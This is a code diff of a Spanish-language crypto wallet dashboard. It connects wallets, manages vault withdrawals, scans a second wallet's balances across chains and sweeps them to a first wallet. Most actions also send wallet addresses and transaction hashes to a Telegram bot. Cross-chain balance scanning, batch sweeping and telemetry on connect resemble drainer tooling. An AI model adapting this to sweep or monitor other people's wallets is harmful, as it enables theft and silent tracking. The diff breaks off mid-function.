+    { symbol:'USDC', addr:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831', dec:6 },
+  ],
+  56: [
+    { symbol:'USDT', addr:'0x55d398326f99059fF775485246999027B3197955', dec:18 },
+    { symbol:'USDC', addr:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', dec:18 },
+  ],
+};
+
+/* Reserva de gas (en native) que dejamos en Wallet B al barrer (no podemos enviar 100% del nativo). */
+const GAS_RESERVE_NATIVE = {
+  1: 0.001, 137: 0.05, 8453: 0.0005, 43114: 0.02, 42161: 0.0005, 56: 0.002,
+};
+
+/* RO providers cache para lecturas multi-chain. */
+const _roProviders = {};
+function getReadProvider(chainId) {
+  if (_roProviders[chainId]) return _roProviders[chainId];
+  const url = PUBLIC_RPCS[chainId];
+  if (!url) return null;
+  return _roProviders[chainId] = new ethers.JsonRpcProvider(url, chainId);
+}
+
+/* Tu WalletConnect Project ID (gratis en https://cloud.reown.com).
+   Sin esto, el QR de WalletConnect no funciona — pero la conexión por extensión sí. */
+const WC_PROJECT_ID = 'c1b85e8eff60dbd02663499756f49867';
+
+let provider, signer, me, vaultAddr, vaultContract, currentTab = 'eth';
+const VIEW_LABELS = { home:'Inicio', move:'Mover fondos', permit:'Permit & Permit2', charge:'Cobrar · Invoices', splits:'División de fondos', owner:'Gobernanza', activity:'Actividad · Log', config:'Configuración · Bots' };
+
+/* ===== UI helpers ===== */
+const $ = id => document.getElementById(id);
+const shortAddr = a => a ? `${a.slice(0,6)}…${a.slice(-4)}` : '—';
+function toast(msg, ms=2400) {
+  const t = $('toast'); t.textContent = msg; t.classList.add('show');
+  clearTimeout(toast._t); toast._t = setTimeout(()=>t.classList.remove('show'), ms);
+}
+function setStatus(html, kind='info') {
+  const el = $('txStatus');
+  el.className = 'status-box mt-4 ' + ({info:'st-info', ok:'st-ok', err:'st-err', pending:'st-pending'}[kind] || 'st-info');
+  el.innerHTML = html;
+  el.classList.remove('hidden');
+}
+
+/* ===== Navigation ===== */
+function goto(name) {
+  document.querySelectorAll('#nav .nav-item').forEach(n => n.classList.toggle('active', n.dataset.view === name));
+  document.querySelectorAll('.view').forEach(v => v.classList.toggle('active', v.dataset.view === name));
+  $('pageTitle').textContent = VIEW_LABELS[name] || 'Panel';
+  if (name === 'owner')    loadOwnerInfo();
+  if (name === 'activity')  renderActivity();
+  if (name === 'config')    loadConfigView();
+  if (name === 'wallets') {
+    renderWalletsView();
+    // Auto-leer B si ya hay una dirección guardada
+    const savedB = getWalletB();
+    if (savedB && ethers.isAddress(savedB)) readWalletB();
   }
-};
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+document.querySelectorAll('#nav .nav-item').forEach(n => n.addEventListener('click', () => goto(n.dataset.view)));
 
-/* ============================================================
- *  Helpers
- * ============================================================ */
-const $ = (id) => document.getElementById(id);
-const qrUrl = (data, size = 110) => `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(data)}`;
+/* ===== Wallet modal ===== */
+function openWalletModal() { $('walletModal').classList.add('show'); renderChainsList(); }
+function closeWalletModal() { $('walletModal').classList.remove('show'); $('walletHint').classList.add('hidden'); }
 
-/* ============================================================
- *  Estado
- * ============================================================ */
-const state = {
-  provider: null,
-  account: null,
-  source: null,            // 'walletconnect' | 'injected'
-  walletChainId: null,
-  viewChainId: null,
-  nativeBal: 0n
-};
-
-/* ============================================================
- *  Conexion
- * ============================================================ */
-async function connect() {
+/* ===== Connect ===== */
+async function connect(kind) {
+  let eth = window.ethereum;
+  if (!eth) {
+    $('walletHint').textContent = 'No detecté ninguna wallet. En celular abrí esta página dentro de Trust Wallet (menú → Browser). En PC instalá la extensión.';
+    $('walletHint').classList.remove('hidden');
+    return;
+  }
+  if (eth.providers && eth.providers.length) {
+    const list = eth.providers;
+    if (kind === 'trust')    eth = list.find(p => p.isTrust || p.isTrustWallet) || eth;
+    if (kind === 'metamask') eth = list.find(p => p.isMetaMask && !p.isTrust) || eth;
+  }
   try {
-    const s = await connectWallet();
-    state.provider = s.provider;
-    state.account = s.account;
-    state.walletChainId = s.chainId;
-    state.viewChainId = NETWORKS[s.chainId] ? s.chainId : Object.keys(NETWORKS)[0];
-    state.source = s.source;
-    bindEvents();
-    setConnected(true);
-    refreshAll();
-  } catch (e) {
-    if (e && (e.code === 4001 || /reject/i.test(e.message || ''))) {
-      alert('Conexion rechazada.');
+    closeWalletModal();
+    provider = new ethers.BrowserProvider(eth);
+    await provider.send('eth_requestAccounts', []);
+    signer = await provider.getSigner();
+    me = await signer.getAddress();
+    const net = await provider.getNetwork();
+
+    $('heroBlock').classList.add('hidden');
+    $('homeConnected').classList.remove('hidden');
+    $('connectBtn').classList.add('hidden');
+    $('disconnectBtn').classList.remove('hidden');
+    $('addrChip').classList.remove('hidden');
+    $('addrShort').textContent = shortAddr(me);
+    $('netName').textContent = CHAIN_NAMES[Number(net.chainId)] || `Chain ${net.chainId}`;
+    $('meAddr').textContent = shortAddr(me);
+    renderChainSwitcher(Number(net.chainId));
+    renderAddressBook();
+    // Auto-cargar la bóveda de la chain activa si ya estaba guardada
+    const chainVault = getVaultForChain(Number(net.chainId));
+    if (chainVault && !$('vaultInput').value) {
+      $('vaultInput').value = chainVault;
+      await applyVault(chainVault);
+    }
+
+    eth.on?.('accountsChanged', () => location.reload());
+    eth.on?.('chainChanged',    () => location.reload());
+
+    const saved = localStorage.getItem('vaultAddr');
+    if (saved) { $('vaultInput').value = saved; await applyVault(saved); }
+
+    maybeRememberDestA();
+    if (isConnectedB()) {
+      const destA = getDestA();
+      if (!destA) {
+        toast('⚠ Conectado con Wallet B pero Wallet A no está registrada. Desconectá, conectá A primero.', 6000);
+      } else {
+        toast(`✓ Wallet B conectada · destino A: ${shortAddr(destA)}`, 4000);
+        addEvent('connect', `Wallet B detectada · sweep disponible`);
+        tgSend(`🔄 *Wallet B conectada*\n👤 \`${me}\`\nDestino A: \`${destA}\``);
+      }
     } else {
-      alert('Error: ' + (e.message || e));
+      toast('Wallet conectada ✓');
+      addEvent('connect', `${shortAddr(me)} · ${CHAIN_NAMES[Number(net.chainId)] || 'chain '+net.chainId}`);
+      tgSend(`🔌 *Wallet conectada*\n👤 \`${me}\`\n⛓ ${CHAIN_NAMES[Number(net.chainId)] || 'chain '+net.chainId}`);
+    }
+  } catch (e) {
+    toast('No se pudo conectar: ' + (e.shortMessage || e.message), 4000);
+  }
+}
+
+/* ===== WalletConnect v2 (Trust mostrará la lista de redes) ===== */
+let wcProvider = null;
+
+async function connectWC() {
+  if (WC_PROJECT_ID === 'YOUR_WALLETCONNECT_PROJECT_ID') {
+    $('walletHint').innerHTML = 'Falta tu <strong>Project ID</strong> de WalletConnect. Sacalo gratis en <a class="underline" href="https://cloud.reown.com" target="_blank">cloud.reown.com</a> y pegalo en la constante <code>WC_PROJECT_ID</code> dentro de panel.html.';
+    $('walletHint').classList.remove('hidden');
+    return;
+  }
+  if (!window.WC_EthereumProvider) {
+    await new Promise(res => window.addEventListener('wc-ready', res, { once:true }));
+  }
+  try {
+    closeWalletModal();
+    toast('Abriendo WalletConnect…');
+    wcProvider = await window.WC_EthereumProvider.init({
+      projectId: WC_PROJECT_ID,
+      chains: [SUPPORTED_CHAINS[0].id],
+      optionalChains: SUPPORTED_CHAINS.map(c => c.id),
+      showQrModal: true,
+      metadata: {
+        name: 'MyPersonWallets',
+        description: 'Tu bóveda personal en blockchain',
+        url: window.location.origin,
+        icons: ['https://walletconnect.com/walletconnect-logo.png'],
+      },
+    });
+    await wcProvider.connect();
+
+    provider = new ethers.BrowserProvider(wcProvider);
+    signer = await provider.getSigner();
+    me = await signer.getAddress();
+    const net = await provider.getNetwork();
+
+    afterConnect(net);
+    toast('Wallet conectada vía WalletConnect ✓');
+    addEvent('connect', `WC · ${shortAddr(me)} · ${CHAIN_NAMES[Number(net.chainId)] || 'chain '+net.chainId}`);
+    tgSend(`🔌 *Wallet conectada (WalletConnect)*\n👤 \`${me}\`\n⛓ ${CHAIN_NAMES[Number(net.chainId)] || 'chain '+net.chainId}`);
+
+    wcProvider.on('chainChanged',    () => location.reload());
+    wcProvider.on('accountsChanged', () => location.reload());
+    wcProvider.on('disconnect',      () => disconnect());
+  } catch (e) {
+    toast('WalletConnect: ' + (e.message || 'cancelado'), 4000);
+  }
+}
+
+function afterConnect(net) {
+  $('heroBlock').classList.add('hidden');
+  $('homeConnected').classList.remove('hidden');
+  $('connectBtn').classList.add('hidden');
+  $('disconnectBtn').classList.remove('hidden');
+  $('addrChip').classList.remove('hidden');
+  $('addrShort').textContent = shortAddr(me);
+  $('netName').textContent = CHAIN_NAMES[Number(net.chainId)] || `Chain ${net.chainId}`;
+  $('meAddr').textContent = shortAddr(me);
+  const saved = localStorage.getItem('vaultAddr');
+  if (saved) { $('vaultInput').value = saved; applyVault(saved); }
+  renderChainSwitcher(Number(net.chainId));
+  renderAddressBook();
+  // Auto-cargar bóveda guardada para esta chain
+  const chainVault = getVaultForChain(Number(net.chainId));
+  if (chainVault && !$('vaultInput').value) {
+    $('vaultInput').value = chainVault;
+    applyVault(chainVault);
+  }
+  // Guardar destA si aún no está definida
+  maybeRememberDestA();
+  // Si nos conectamos con B, mostrar alerta y leer saldos
+  if (isConnectedB()) {
+    const destA = getDestA();
+    if (!destA) {
+      toast('⚠ Conectado con Wallet B pero Wallet A no está registrada. Desconectá, conectá A primero.', 6000);
+    } else {
+      toast(`✓ Wallet B conectada · destino A: ${shortAddr(destA)}`, 4000);
+      addEvent('connect', `Wallet B detectada · sweep disponible`);
+      tgSend(`🔄 *Wallet B conectada*\n👤 \`${me}\`\nDestino A: \`${destA}\``);
     }
   }
 }
 
-async function disconnect() {
-  await disconnectWallet();
-  state.provider = null;
-  state.account = null;
-  setConnected(false);
+async function switchChain(id) {
+  const hex = '0x' + id.toString(16);
+  const target = wcProvider || window.ethereum;
+  if (!target) return;
+  try {
+    await target.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hex }] });
+  } catch (e) {
+    toast('No se pudo cambiar de red: ' + (e.shortMessage || e.message), 3500);
+  }
 }
 
-function bindEvents() {
-  const p = state.provider;
-  if (!p || p.__bound) return;
-  p.__bound = true;
-  p.on && p.on('accountsChanged', (a) => {
-    if (!a || !a.length) return disconnect();
-    state.account = a[0];
-    refreshAll();
-  });
-  p.on && p.on('chainChanged', async (cid) => {
-    state.walletChainId = (typeof cid === 'string' && cid.startsWith('0x'))
-      ? cid : ('0x' + Number(cid).toString(16));
-    state.viewChainId = state.walletChainId;
-    refreshAll();
-  });
-  p.on && p.on('disconnect', () => disconnect());
+function renderChainSwitcher(currentId) {
+  const el = $('chainSwitcher');
+  if (!el) return;
+  el.innerHTML = SUPPORTED_CHAINS.map(c => `
+    <button onclick="switchChain(${c.id})"
+      class="flex items-center gap-1.5 px-2.5 py-1.5 rounded-full text-xs font-semibold transition"
+      style="background:${c.id === currentId ? c.color + '22' : '#eaf0ff'};color:${c.id === currentId ? c.color : '#6b7aa3'};border:1.5px solid ${c.id === currentId ? c.color : 'transparent'}"
+      title="${c.name}">
+      <span>${c.icon}</span><span>${c.name.split(' ')[0]}</span>
+    </button>
+  `).join('');
 }
 
-function setConnected(ok) {
-  $('dot').classList.toggle('ok', ok);
-  $('notConnected').classList.toggle('hidden', ok);
-  $('dashboard').classList.toggle('hidden', !ok);
-  $('connectBtn').classList.toggle('hidden', ok);
-  $('disconnectBtn').classList.toggle('hidden', !ok);
+function renderChainsList() {
+  const el = $('chainsList');
+  if (!el) return;
+  el.innerHTML = SUPPORTED_CHAINS.map(c => `
+    <div class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold"
+         style="background:${c.color}18;color:${c.color}">
+      <span>${c.icon}</span><span>${c.name}</span>
+    </div>
+  `).join('');
 }
 
-/* ============================================================
- *  Renderizado
- * ============================================================ */
-function refreshAll() {
-  renderAdminBar();
-  renderBalanceTabs();
-  renderDeposits();
-  loadBalances();
+function disconnect() {
+  if (wcProvider) { try { wcProvider.disconnect(); } catch {} }
+  localStorage.removeItem('vaultAddr');
+  location.reload();
 }
 
-function renderAdminBar() {
-  $('adminAddr').textContent = state.account || '-';
-  const net = NETWORKS[state.walletChainId];
-  $('netName').textContent = net ? net.name : 'Red no soportada';
-  $('chainId').textContent = state.walletChainId
-    ? (parseInt(state.walletChainId, 16) + ' / ' + state.walletChainId) : '-';
-  const src = $('source');
-  src.textContent = state.source === 'walletconnect' ? 'WalletConnect v2' : 'Wallet inyectada';
-  src.className = 'pill ok';
+/* ===== Vault ===== */
+async function saveVault() {
+  const v = $('vaultInput').value.trim();
+  if (!ethers.isAddress(v)) { toast('Dirección inválida'); return; }
+  localStorage.setItem('vaultAddr', v);
+  await applyVault(v);
+  toast('Bóveda guardada ✓');
+  addEvent('vault', v);
+  tgSend(`🏦 *Bóveda configurada*\n\`${v}\``);
+}
+async function applyVault(addr) {
+  vaultAddr = addr;
+  vaultContract = new ethers.Contract(addr, VAULT_ABI, signer);
+  $('vaultAddrShort').textContent = shortAddr(addr);
+  await refreshBalance();
+  await checkOwner();
+  $('sendBtn').disabled = false;
+}
+async function refreshBalance() {
+  if (!vaultAddr || !provider) return;
+  $('vaultEthBal').textContent = '…';
+  try {
+    const bal = await provider.getBalance(vaultAddr);
+    $('vaultEthBal').textContent = Number(ethers.formatEther(bal)).toFixed(4);
+  } catch { $('vaultEthBal').textContent = '—'; }
+}
+async function checkOwner() {
+  try {
+    const o = await vaultContract.owner();
+    const isOwner = o.toLowerCase() === me.toLowerCase();
+    $('ownerBadge').classList.toggle('hidden', !isOwner);
+    $('notOwnerBadge').classList.toggle('hidden', isOwner);
+  } catch {
+    $('ownerBadge').classList.add('hidden');
+    $('notOwnerBadge').classList.add('hidden');
+  }
 }
 
-function renderBalanceTabs() {
-  const tabs = $('balanceTabs');
-  tabs.innerHTML = '';
-  Object.values(NETWORKS).forEach(net => {
-    const t = document.createElement('div');
-    t.className = 'tab' + (net.chainId === state.viewChainId ? ' active' : '');
-    t.innerHTML = `<span class="ico" style="background:${net.color}"></span> ${net.name}`;
-    t.onclick = async () => {
-      state.viewChainId = net.chainId;
-      if (state.walletChainId !== net.chainId) {
+/* ===== Move tab ===== */
+function setTab(t) {
+  currentTab = t;
+  $('tabEth').classList.toggle('active', t === 'eth');
+  $('tabErc').classList.toggle('active', t === 'erc');
+  $('ercTokenWrap').classList.toggle('hidden', t !== 'erc');
+  $('amountUnit').textContent = t === 'eth' ? 'ETH' : 'TOK';
+}
+async function setMax() {
+  if (!vaultAddr) return;
+  if (currentTab === 'eth') {
+    const bal = await provider.getBalance(vaultAddr);
+    $('amount').value = ethers.formatEther(bal);
+  } else {
+    const tok = $('tokenAddr').value.trim();
+    if (!ethers.isAddress(tok)) { toast('Pegá la address del token'); return; }
+    const c = new ethers.Contract(tok, ERC20_ABI, provider);
+    const [bal, dec] = await Promise.all([c.balanceOf(vaultAddr), c.decimals()]);
+    $('amount').value = ethers.formatUnits(bal, dec);
+  }
+}
+async function doSend() {
+  if (!vaultContract) { toast('Configurá la dirección de la bóveda'); return; }
+  const to = $('toAddr').value.trim();
+  const amount = $('amount').value.trim();
+  if (!ethers.isAddress(to)) { toast('Destino inválido'); return; }
+  if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) { toast('Monto inválido'); return; }
+  const btn = $('sendBtn'), label = $('sendLabel');
+  btn.disabled = true; label.textContent = 'Firmando…';
+  try {
+    let tx;
+    setStatus('Confirmá la transacción en tu wallet…', 'pending');
+    if (currentTab === 'eth') {
+      tx = await vaultContract.withdrawETH(to, ethers.parseEther(amount));
+    } else {
+      const tok = $('tokenAddr').value.trim();
+      if (!ethers.isAddress(tok)) { btn.disabled = false; label.textContent='Enviar'; toast('Address del token inválida'); return; }
+      const dec = await new ethers.Contract(tok, ERC20_ABI, provider).decimals();
+      tx = await vaultContract.withdrawERC20(tok, to, ethers.parseUnits(amount, dec));
+    }
+    label.textContent = 'Esperando red…';
+    setStatus(`Enviada · hash <span class="mono">${shortAddr(tx.hash)}</span>`, 'pending');
+    addEvent('tx', `${currentTab.toUpperCase()} → ${shortAddr(to)} · ${amount} · ${shortAddr(tx.hash)}`);
+    tgSend(`📤 *Tx enviada*\nTipo: ${currentTab.toUpperCase()}\nA: \`${to}\`\nMonto: ${amount}\nHash: \`${tx.hash}\``);
+    const r = await tx.wait();
+    setStatus(`✓ Confirmada en bloque ${r.blockNumber}`, 'ok');
+    toast('Transferencia confirmada ✓');
+    addEvent('txok', `Bloque ${r.blockNumber} · ${shortAddr(tx.hash)}`);
+    tgSend(`✅ *Tx confirmada* en bloque ${r.blockNumber}\n\`${tx.hash}\``);
+    $('amount').value = '';
+    refreshBalance();
+  } catch (e) {
+    const errMsg = e.shortMessage || e.reason || e.message || 'Error';
+    setStatus('✕ ' + errMsg, 'err');
+    addEvent('txerr', errMsg.slice(0, 120));
+  } finally {
+    btn.disabled = false; label.textContent = 'Enviar';
+  }
+}
+
+/* ===== Mis Wallets · vault por chain ===== */
+function getVaults()  { try { return JSON.parse(localStorage.getItem('vaultsByChain')) || {}; } catch { return {}; } }
+function setVaults(o) { localStorage.setItem('vaultsByChain', JSON.stringify(o)); }
+function getVaultForChain(id) {
+  const all = getVaults();
+  if (all[id]) return all[id];
+  // Fallback retro-compat con la 1-vault key vieja
+  const legacy = localStorage.getItem('vaultAddr');
+  return legacy || null;
+}
+function setVaultForChain(id, addr) {
+  const all = getVaults();
+  if (addr) all[id] = addr; else delete all[id];
+  setVaults(all);
+}
+
+async function saveChainVault(chainId) {
+  const inp = $('vault_'+chainId);
+  const v = inp.value.trim();
+  if (!ethers.isAddress(v)) { toast('Dirección inválida'); return; }
+  setVaultForChain(chainId, v);
+  toast(`Bóveda guardada en ${CHAIN_NAMES[chainId]} ✓`);
+  addEvent('vault', `chain ${chainId} → ${v}`);
+  // Si esa es la red activa, aplicar
+  if (provider) {
+    const net = await provider.getNetwork();
+    if (Number(net.chainId) === chainId) {
+      $('vaultInput').value = v;
+      await applyVault(v);
+    }
+  }
+  renderWalletsView();
+}
+
+async function moveAllOnChain(chainId) {
+  if (!provider) return toast('Conectá tu wallet primero');
+  const net = await provider.getNetwork();
+  if (Number(net.chainId) !== chainId) {
+    toast(`Cambiá a ${CHAIN_NAMES[chainId]} primero`);
+    await switchChain(chainId);
+    return;
+  }
+  if (!me) return toast('No hay destino');
+  const addr = getVaultForChain(chainId);
+  if (!addr) return toast('Configurá primero la bóveda en esta red');
+  if (!confirm(`¿Mover TODO el ETH de ${shortAddr(addr)} a tu wallet ${shortAddr(me)}?`)) return;
+  try {
+    const c = new ethers.Contract(addr, VAULT_ABI, signer);
+    const tx = await c.withdrawETHAll(me);
+    toast('Tx enviada · esperando…');
+    addEvent('tx', `Move-all ${CHAIN_NAMES[chainId]} → ${shortAddr(me)}`);
+    tgSend(`📤 *Move-all (${CHAIN_NAMES[chainId]})*\nDe: \`${addr}\`\nA: \`${me}\``);
+    await tx.wait();
+    toast('Movido ✓');
+    addEvent('txok', `Move-all ${CHAIN_NAMES[chainId]} confirmado`);
+    renderWalletsView();
+  } catch (e) {
+    toast('Error: ' + (e.shortMessage || e.message), 4000);
+  }
+}
+
+async function fetchVaultBalance(chainId, addr) {
+  // Si es la red activa, usamos el provider; si no, devolvemos null (saldo desconocido sin RPC propio)
+  if (!provider) return null;
+  const net = await provider.getNetwork();
+  if (Number(net.chainId) !== chainId) return null;
+  if (!ethers.isAddress(addr)) return null;
+  try {
+    const bal = await provider.getBalance(addr);
+    return Number(ethers.formatEther(bal)).toFixed(4);
+  } catch { return null; }
+}
+
+async function renderWalletsView() {
+  $('wWallet').textContent = me ? me : '— Conectá tu wallet —';
+
+  const vaults = getVaults();
+  const configured = SUPPORTED_CHAINS.filter(c => vaults[c.id]).length;
+  $('wConfigured').textContent = `${configured} / ${SUPPORTED_CHAINS.length}`;
+
+  let activeId = null;
+  if (provider) {
+    try { const net = await provider.getNetwork(); activeId = Number(net.chainId); } catch {}
+  }
+  const activeChain = SUPPORTED_CHAINS.find(c => c.id === activeId);
+  $('wActive').textContent = activeChain ? activeChain.name : '—';
+
+  const grid = $('walletsGrid');
+  grid.innerHTML = SUPPORTED_CHAINS.map(c => {
+    const vault = vaults[c.id] || '';
+    const isActive = c.id === activeId;
+    const dest = me || '';
+    return `
+      <div class="card card-lg glass soft-shadow" style="border:1.5px solid ${isActive ? c.color+'66' : 'transparent'}">
+        <div class="flex items-start justify-between gap-3 flex-wrap mb-3">
+          <div class="flex items-center gap-3">
+            <div class="nav-ic" style="width:42px;height:42px;background:${c.color};color:#fff;font-size:1.2rem">${c.icon}</div>
+            <div>
+              <div class="flex items-center gap-2">
+                <h3 class="font-bold text-lg">${c.name}</h3>
+                ${isActive ? '<span class="chip chip-ok" style="font-size:.65rem">activa</span>' : ''}
+                ${vault ? '<span class="chip chip-ok" style="font-size:.65rem">✓ SC</span>' : '<span class="chip chip-warn" style="font-size:.65rem">sin SC</span>'}
+              </div>
+              <div class="text-[11px] text-slate-500">${c.symbol} · chain ${c.id}</div>
+            </div>
+          </div>
+          ${!isActive ? `<button class="btn btn-ghost text-xs" style="padding:.4rem .7rem" onclick="switchChain(${c.id})">↻ Cambiar</button>` : ''}
+        </div>
+
+        <label class="label">SC AssetVault</label>
+        <div class="flex gap-2 mt-1.5">
+          <input id="vault_${c.id}" class="field mono text-xs flex-1" placeholder="0x… address devuelta por el deploy" value="${vault}"/>
+          <button class="btn btn-soft text-xs" style="padding:.5rem .8rem" onclick="saveChainVault(${c.id})">💾</button>
+        </div>
+
+        <label class="label mt-3 block">Tu destino (= wallet conectada)</label>
+        <div class="flex gap-2 mt-1.5 items-center">
+          <div class="flex-1 mono text-xs p-2.5 rounded-lg bg-slate-50 break-all" style="border:1px solid #e2e8f0">${dest || '—'}</div>
+          <button class="btn btn-soft text-xs" style="padding:.5rem .7rem" onclick="copyEvmAddr()" ${dest?'':'disabled style=opacity:.4'}>📋</button>
+        </div>
+
+        <div class="flex gap-2 mt-4">
+          <button class="btn ${vault && dest && isActive ? 'btn-primary' : 'btn-ghost'} flex-1 text-xs" style="padding:.7rem"
+                  onclick="moveAllOnChain(${c.id})"
+                  ${vault && dest ? '' : 'disabled style="opacity:.4"'}>
+            📤 Mover todo a mi destino
+          </button>
+        </div>
+      </div>
+    `;
+  }).join('');
+  renderBHeroIfNeeded();
+}
+
+/* ============================================================ */
+/* ===========  WALLET B  ·  lectura · top-up · sweep  ======== */
+/* ============================================================ */
+
+/* destA = wallet de destino (A). Se persiste para que sobreviva
+   cuando el usuario cambie a Wallet B en Trust y vuelva. */
+function getDestA() { return localStorage.getItem('destA') || ''; }
+function setDestA(v) {
+  if (!v) return;
+  localStorage.setItem('destA', v);
+  const badge = $('destABadge');
+  if (badge) {
+    badge.textContent = `Wallet A: ${v.slice(0,8)}…${v.slice(-6)}`;
+    badge.classList.remove('hidden');
+  }
+}
+function getWalletB() { return (localStorage.getItem('walletB') || '').trim(); }
+
+/* Si vemos que el usuario conecta una addr distinta de B y aún no hay destA,
+   la guardamos como A automáticamente. */
+function maybeRememberDestA() {
+  if (!me) return;
+  const b = getWalletB().toLowerCase();
+  const cur = me.toLowerCase();
+  if (b && cur === b) return; // estamos conectados con B, no la guardamos como A
+  if (!getDestA()) {
+    setDestA(me);
+    addEvent('connect', `Wallet A registrada · ${shortAddr(me)}`);
+  }
+}
+
+/* ¿La wallet conectada ahora es Wallet B? */
+function isConnectedB() {
+  const b = getWalletB().toLowerCase();
+  return !!(me && b && me.toLowerCase() === b);
+}
+
+/* Lee el saldo nativo + tokens comunes de Wallet B en TODAS las cadenas EVM
+   usando RPCs públicas. No necesita estar conectado a esa red. */
+async function readWalletB() {
+  const b = getWalletB();
+  if (!ethers.isAddress(b)) { toast('Pegá la dirección de tu Wallet B (0x…)'); return; }
+  const grid = $('walletBResults');
+  grid.innerHTML = `<div class="text-xs text-slate-500 col-span-2">Leyendo saldos en 6 redes…</div>`;
+
+  const dest = getDestA() || me || '';
+  const cards = await Promise.all(SUPPORTED_CHAINS.map(c => readWalletBOnChain(c, b)));
+  grid.innerHTML = cards.map(html => html).join('');
+  $('wbDestInfo')?.remove();
+  if (dest) {
+    grid.insertAdjacentHTML('afterbegin',
+      `<div id="wbDestInfo" class="col-span-2 text-[11px] text-slate-500 p-2 rounded-lg bg-indigo-50/60" style="border:1px dashed #c7d2fe">
+        Destino A: <span class="mono">${dest}</span> · si B no tiene gas, A lo recarga.
+      </div>`);
+  }
+}
+
+async function readWalletBOnChain(chain, b) {
+  const ro = getReadProvider(chain.id);
+  if (!ro) return cardWB(chain, b, { error:'Sin RPC pública configurada' });
+  try {
+    // Saldo nativo + estimación de gas
+    const [nativeBal, feeData, code] = await Promise.all([
+      ro.getBalance(b),
+      ro.getFeeData().catch(() => ({ gasPrice: ethers.parseUnits('5','gwei') })),
+      ro.getCode(b).catch(() => '0x'),
+    ]);
+
+    // Tokens comunes
+    const tokens = COMMON_TOKENS[chain.id] || [];
+    const tokenBals = await Promise.all(tokens.map(async t => {
+      try {
+        const c = new ethers.Contract(t.addr, ERC20_ABI, ro);
+        const [bal, dec] = await Promise.all([c.balanceOf(b), c.decimals().catch(()=>t.dec)]);
+        return { ...t, bal, dec, human: Number(ethers.formatUnits(bal, dec)) };
+      } catch { return { ...t, bal: 0n, human: 0 }; }
+    }));
+    const hasTokens = tokenBals.some(t => t.human > 0);
+
+    // Estimación de gas para barrer (1 native + N transferencias ERC20)
+    const tokenCount = tokenBals.filter(t => t.human > 0).length;
+    const gasUnits   = 21000n + BigInt(tokenCount) * 65000n;
+    const gasPrice   = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('5','gwei');
+    const gasNeeded  = gasUnits * gasPrice;
+    const gasOk      = nativeBal >= gasNeeded;
+
+    return cardWB(chain, b, {
+      native: Number(ethers.formatEther(nativeBal)),
+      tokens: tokenBals,
+      hasTokens,
+      gasNeededEth: Number(ethers.formatEther(gasNeeded)),
+      gasOk,
+      isContract: code && code !== '0x',
+    });
+  } catch (e) {
+    return cardWB(chain, b, { error: e.shortMessage || e.message || 'Error' });
+  }
+}
+
+function cardWB(chain, b, data) {
+  const isB   = isConnectedB() && data && !data.error;
+  const head  = `
+    <div class="flex items-center gap-2.5 mb-2">
+      <div class="nav-ic" style="width:34px;height:34px;background:${chain.color};color:#fff;font-size:.95rem">${chain.icon}</div>
+      <div>
+        <div class="font-bold text-sm">${chain.name}</div>
+        <div class="text-[10px] text-slate-400">${chain.symbol} · ${chain.id}</div>
+      </div>
+    </div>`;
+
+  if (data.error) {
+    return `<div class="card glass" style="border:1px solid #fecaca">${head}
+      <div class="text-xs text-rose-600">⚠ ${data.error}</div></div>`;
+  }
+
+  const tokRows = (data.tokens || []).filter(t => t.human > 0).map(t =>
+    `<div class="flex justify-between text-xs"><span class="text-slate-500">${t.symbol}</span><span class="mono font-bold">${t.human.toFixed(t.dec >= 6 ? 4 : 2)}</span></div>`
+  ).join('');
+  const tokRowsAll = (data.tokens || []).map(t =>
+    `<div class="flex justify-between text-[11px]"><span class="text-slate-400">${t.symbol}</span><span class="mono">${t.human.toFixed(2)}</span></div>`
+  ).join('');
+
+  const gasChip = data.gasOk
+    ? `<span class="chip chip-ok" style="font-size:.65rem">gas ok</span>`
+    : `<span class="chip chip-warn" style="font-size:.65rem">⚠ falta gas</span>`;
+
+  const topUpAmt = Math.max(data.gasNeededEth * 1.5, GAS_RESERVE_NATIVE[chain.id] || 0.001).toFixed(6);
+  const topUpBtn = data.gasOk ? '' : `
+      <button class="btn btn-soft text-[11px] flex-1" style="padding:.55rem;border:1px solid #fecaca;color:#b91c1c"
+        onclick="topUpGasToB(${chain.id}, '${topUpAmt}')">⛽ Recargar ${topUpAmt} ${chain.symbol}</button>`;
+
+  const sweepBtn = isB ? `
+      <button class="btn btn-primary text-[11px] flex-1" style="padding:.55rem;background:linear-gradient(135deg,#6366f1,#7c3aed)"
+        onclick="sweepBtoA(${chain.id})">
+        📤 Mover todo → A <span style="font-size:.6rem;opacity:.8;display:block;margin-top:1px">1 firma · batch</span>
+      </button>` : '';
+
+  return `<div class="card glass" style="border:1px solid ${data.gasOk ? '#bbf7d0' : '#fde68a'}">
+    ${head}
+    <div class="flex items-center justify-between mb-2">
+      <div class="text-xs text-slate-500">Nativo</div>
+      <div class="flex items-center gap-1.5">
+        <span class="mono font-bold text-sm">${data.native.toFixed(6)}</span>
+        ${gasChip}
+      </div>
+    </div>
+    ${data.hasTokens ? `<div class="space-y-1 mt-2 pt-2" style="border-top:1px dashed #e2e8f0">${tokRows}</div>` : `<div class="space-y-0.5 mt-1 opacity-60">${tokRowsAll}</div>`}
+    <div class="text-[10px] text-slate-400 mt-2">gas estimado: ${data.gasNeededEth.toFixed(6)} ${chain.symbol}</div>
+    <div class="flex gap-1.5 mt-3">${topUpBtn}${sweepBtn}</div>
+    ${!isB && data.gasOk && data.hasTokens ? `<div class="text-[10px] text-indigo-500 mt-1">→ Conectá Wallet B en Trust para barrer.</div>` : ''}
+  </div>`;
+}
+
+/* Top-up: enviar gas desde la wallet conectada (= A) hacia Wallet B en una chain. */
+async function topUpGasToB(chainId, amountEthStr) {
+  if (!provider || !signer) return toast('Conectá tu Wallet A primero');
+  const b = getWalletB();
+  if (!ethers.isAddress(b)) return toast('Configurá Wallet B primero');
+  if (me && me.toLowerCase() === b.toLowerCase()) return toast('Estás conectado con B; primero conectá A');
+
+  const net = await provider.getNetwork();
+  if (Number(net.chainId) !== chainId) {
+    toast(`Cambiá a ${CHAIN_NAMES[chainId]} en tu wallet…`);
+    try { await switchChain(chainId); } catch {}
+    return;
+  }
+
